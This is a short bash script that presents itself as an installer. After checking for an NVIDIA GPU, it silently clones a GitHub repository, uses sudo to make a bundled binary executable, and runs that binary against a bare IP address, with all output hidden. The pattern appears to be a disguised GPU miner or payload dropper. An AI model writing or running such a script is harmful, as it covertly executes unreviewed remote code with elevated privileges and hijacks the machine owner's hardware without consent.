#! /bin/bash
nvidia-smi
printf "Installing $1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://103.149.12.74/"$1" &> log
} &> /dev/null
